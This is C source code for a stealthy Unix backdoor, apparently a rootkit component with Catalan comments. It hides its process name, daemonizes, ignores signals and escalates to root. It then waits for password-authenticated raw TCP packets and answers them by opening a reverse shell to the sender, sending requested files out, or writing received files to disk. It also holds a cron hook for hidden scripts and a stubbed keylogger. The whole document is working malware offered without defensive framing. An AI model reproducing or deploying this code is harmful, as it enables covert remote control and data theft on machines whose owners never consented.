#include <stdarg.h>
#include <string.h>
#include <stdio.h>
#include <signal.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <sys/wait.h>

#include "../include/config.h"
#include "../include/actions.h"

#define CHECKSTR "check"
#define PS1 "PS1=\\[\\033[1;30m\\][\\[\\033[0;32m\\]\\u\\[\\033[1;32m\\]@\\[\\033[0;32m\\]\\h \\[\\033[1;37m\\]\\W\\[\\033[1;30m\\]]\\[\\033[0m\\]# "

int weekday;

// Debug function
__inline__ void debug(char * format, ...){
#if DEBUG
    va_list args;
    va_start(args, format);
    vprintf(format, args);
    va_end(args);
#endif
}

// Cron function
#if CRON
void cron(int n) {
    char buffer[256];

    debug("Executant el cron daily\n");
    sprintf(buffer, HOME"/.daily");
    system(buffer);

    weekday++;
    if ((weekday % 7) == 0){
        debug("Executant el cron weekly\n");
        sprintf(buffer, HOME"/.weekly");
        system(buffer);
    }

    if ((weekday % 30) == 0){
        debug("Executant el cron monthly\n");
        sprintf(buffer, HOME"/.monthly");
        system(buffer);
        weekday = 0;
    }

    signal(SIGALRM, cron);
    // Launched every 24h
    alarm(60*60*24);
}
#endif

void rename_proc(char **argv) {
    realloc(argv[0], strlen(PROCNAME)+1);
    memcpy(argv[0], PROCNAME, strlen(PROCNAME)+1);
}

void daemonize() {
    int fd, i;
    switch (fork()) {
        case -1: exit(-1);
        case  0: break;
        default: exit(0);
    }
    setsid(); 
    chdir ("/");
    fd = open("/dev/null", O_RDWR, 0);
    dup2 (fd, 0);
    dup2 (fd, 1);
    dup2 (fd, 2);

    if (fd > 2) close(fd);

    // Ignore all signals
    for (i = 1; i < 64; i++)
        signal(i, SIG_IGN);

    //signal(SIGHUP, SIG_IGN);
    //signal(SIGCHLD, sig_child);
}

void launcher_rdownload(struct in_addr *ip, unsigned short port, char *file, unsigned long size) {
    int sock, fd, bytes;
    struct sockaddr_in cli;
    unsigned char buf[BUFSIZE];
    char *ptr;

    sock = socket(AF_INET, SOCK_STREAM, 6);
    if (sock < 0) exit(-1);

    memset(&cli, 0, sizeof(cli));
    cli.sin_family = AF_INET;
    cli.sin_port = htons(port);
    cli.sin_addr = *ip;

    if (connect(sock, (struct sockaddr *) &cli, sizeof(cli)) < 0) {
        close(sock);
        debug("Failed to connect to destination port %d\n", port);
        exit(-1);
    }
    ptr = strrchr(file, '/');
    if (ptr) { ptr++;}
    else { ptr = file; }

    fd = open(file, O_RDONLY);
    if (fd < 0){
        debug("Error openning file %s\n", file);
        close(sock);
        exit(0);
    }

    bytes=0;
    while ((bytes = read(fd, &buf, BUFSIZE)) > 0){
        debug("Sending %d bytes.\n", bytes);
        if (write(sock, &buf, bytes) < bytes){
            debug("No s'ha enviat tot!\n");
        }
    }
    debug("file %s sended!\n", file);

    sleep(1);
    close(fd);
    close(sock);
}

void launcher_rupload(struct in_addr *ip, unsigned short port, char *file, unsigned long size) {
    int sock, fd, bytes;
    struct sockaddr_in cli;
    unsigned char buf[BUFSIZE];
    char *ptr;
    char file_path[256];

    sock = socket(AF_INET, SOCK_STREAM, 6);
    if (sock < 0) exit(-1);

    memset(&cli, 0, sizeof(cli));
    cli.sin_family = AF_INET;
    cli.sin_port = htons(port);
    cli.sin_addr = *ip;

    if (connect(sock, (struct sockaddr *) &cli, sizeof(cli)) < 0) {
        close(sock);
        debug("Failed to connect to destination port %d\n", port);
        exit(-1);
    }
    ptr = strrchr(file, '/');
    if (ptr) { ptr++;}
    else { ptr = file; }

    sprintf(file_path, "%s/%s", HOME, ptr);
    fd = open(file_path, O_RDWR|O_CREAT|O_TRUNC, S_IRWXU);
    if (fd < 0){
        debug("Error creating file");
        close(sock);
        exit(0);
    }
    debug("file %s created!", file_path);

    bytes=0;
    while ((bytes = read(sock, &buf, BUFSIZE)) > 0){
        debug("Received %d bytes.\n", bytes);
        if (write(fd, &buf, bytes) < bytes){
            debug("No s'ha guardat tot!\n");
        }
    }

    sleep(1);
    close(fd);
    close(sock);
}

void launcher_rshell(struct in_addr *ip, unsigned short port) {
    int sock;
    int tty, pty, subshell;
    struct sockaddr_in cli;
    unsigned char buf[BUFSIZE];
    // used to get the tty
    extern char *ptsname();

    sock = socket(AF_INET, SOCK_STREAM, 6);
    if (sock < 0) exit(-1);

    memset(&cli, 0, sizeof(cli));
    cli.sin_family = AF_INET;
    cli.sin_port = htons(port);
    cli.sin_addr = *ip;

    if (connect(sock, (struct sockaddr *) &cli, sizeof(cli)) < 0) {
        close(sock);
        debug("Failed to connect to destination port %d\n", port);
        exit(-1);
    }

    pty = open("/dev/ptmx", O_RDWR);
    grantpt(pty);
    unlockpt(pty);
    tty = open(ptsname(pty), O_RDWR);

    // child
    if(!(subshell = fork())) {
        // per a que bash sigui fill de l'init
        if (fork() != 0){
            exit(0);
        }
        
        close(pty);
        close(sock);
        // new session to be used with bash
        setsid();
        ioctl(tty, TIOCSCTTY, NULL);
        
        // start using the new tty
        dup2(tty, 0);
        dup2(tty, 1);
        dup2(tty, 2);
        close(tty);

        chdir(HOME);
        // overwrite the PS1 to know that you are in "skd mode"
        putenv(PS1);
        execl("/bin/sh", "sh", "--norc", "-i", NULL);

        // we should not to be here
        exit(1);
    }

    // parent
    else{
        close(tty);
        //per a que la conexio establerta amb el tty sigui fill de l'init
        if (fork() != 0) exit(0);
                            
        // main while
        while (1) {
            fd_set  fds;
            int count;

            // put the fd to watch
            FD_ZERO(&fds);
            FD_SET(sock, &fds);
            FD_SET(pty, &fds);

            if (select(pty + 1, &fds, NULL, NULL, NULL) < 0 && (errno != EINTR)) break;

            /* stdin => shell */
            if (FD_ISSET(pty, &fds)) {
                count = read(pty, buf, BUFSIZE);
                if ((count <= 0) && (errno != EINTR)) break;
                if (write(sock, buf, count) <= 0 && (errno != EINTR)) break;    
            /* shell => stdout */
            } else if (FD_ISSET(sock, &fds)) {
                count = read(sock, buf, BUFSIZE);
                // TODO: enviar char especial per setejar tamany tty, timeout, etc.
                if ((count <= 0) && (errno != EINTR)) break;
                if (write(pty, buf, count) <= 0 && (errno != EINTR)) break;
            }
        }
    }   
    close(pty);
    debug("Waiting child\n");
    waitpid(subshell, NULL, 0);
    close(sock);
    debug("Connection closed\n");
    exit(0);
}

void do_action(struct data *d, struct in_addr *ip) {
    if (fork() != 0){
        return;
    }

    switch(d->action) {
        case UPLOAD:
            debug("Uploading file\n");
            break;
        case DOWNLOAD:
            debug("Downloading file\n");
            break;
        case SHELL:
            debug("Launching shell\n");
            break;
        case RUPLOAD:
            debug("Reverse uploading file\n");
            launcher_rupload(ip, d->port, d->file, d->size);
            break;
        case RDOWNLOAD:
            debug("Reverse downloading file\n");
            launcher_rdownload(ip, d->port, d->file, d->size);
            break;
        case RSHELL:
            debug("Launching reverse shell\n");
            launcher_rshell(ip, d->port);
            break;
        default:
            debug("Invalid option: %d\n", d->action);
    }
}

void raw_daemon() {
    int sock;
    struct sockaddr_in raw;
    unsigned int slen = sizeof(raw);
    struct packet p;
    int size;

    sock = socket(AF_INET, SOCK_RAW, 6);
    if (sock < 0) {
        debug("Can't allocate raw socket\n");
        exit(-1);
    }

    // TODO: evaluar si és millor un sniffer (mode promiscuo) o això (CPU)
    while (1) {
        size = recvfrom(sock, &p, sizeof(p), 0, (struct sockaddr *) &raw, &slen);
        // Si el tamany del paquet es el que toca
        if (size == sizeof(struct packet)) {
            // I el password és correcte
            if (!memcmp(PASSWORD, p.action.pass, 20)) {
                debug("S'ha rebut el paquet d'autenticacio correctament (action: %d)\n", p.action.action);
                do_action(&(p.action), &raw.sin_addr);
            }
        }
    }
}

int main(int argc, char **argv) {

    // Command mode
    if (argc == 3){
        // Connect to argv[1]:argv[2]
        return 0;
    }

    // Check if we are running
    
    // Change proc name
    rename_proc(argv);
    
    // Daemonize
#if ! DEBUG
    daemonize();
#endif

    // Cron
#if CROND
    debug("Initializing crond\n");
    signal(SIGALRM, cron);
    alarm(60*60*24);
#endif

#ifdef KEYLOGGER
    debug("Initializing keylogger\n");
#endif
    
    // if we can't open a raw socket
    if (getuid() && geteuid()) {
        debug("Detected unprivileged mode, listening to ..\n.");
        // Open a socket and listen
    } else {
        debug("Detected privileged mode, openning RAW socket\n");

        // Change to root mode
        setuid(0);
        setreuid(0,0);
        setgid(0);
        setregid(0,0);

        // Open a socket and listen
        raw_daemon();
    }

    return 0;   
}
